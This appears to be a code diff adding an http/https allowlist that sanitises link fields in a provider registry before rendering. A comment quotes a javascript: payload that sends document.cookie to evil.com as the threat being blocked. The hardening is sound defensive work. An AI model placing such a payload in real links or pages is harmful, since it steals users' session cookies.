@@ -567,6 +567,37 @@ export const PROVIDER_REGISTRY: Record<string, ProviderRegistryEntry> = {
   },
 };
 
+/**
+ * Scheme allowlist for any registry URL that ends up in an `<a href>` or
+ * JSON-LD `sameAs` field. React does not block `javascript:` schemes on
+ * `<a>` (it only warns in dev), so a malicious PR could inject
+ * `javascript:fetch('//evil.com?'+document.cookie)` and exfiltrate
+ * same-origin cookies/localStorage when the link is clicked.
+ *
+ * Returns the URL when safe, `undefined` when the scheme isn't http(s).
+ * Callers should treat undefined as "no link" rather than rendering raw.
+ */
+export function safeRegistryURL(raw: string | undefined): string | undefined {
+  if (!raw) return undefined;
+  try {
+    const u = new URL(raw);
+    if (u.protocol === "http:" || u.protocol === "https:") return raw;
+  } catch {
+    // not a parseable URL — drop it
+  }
+  return undefined;
+}
+
 export function getProviderRegistry(slug: string): ProviderRegistryEntry | undefined {
-  return PROVIDER_REGISTRY[slug.toLowerCase()];
+  const entry = PROVIDER_REGISTRY[slug.toLowerCase()];
+  if (!entry) return undefined;
+  // Sanitise every URL-bearing field at the access boundary so render
+  // sites don't have to remember to filter.
+  return {
+    ...entry,
+    url: safeRegistryURL(entry.url) ?? "",
+    docs: safeRegistryURL(entry.docs),
+    github: safeRegistryURL(entry.github),
+    blog: safeRegistryURL(entry.blog),
+  };
 }
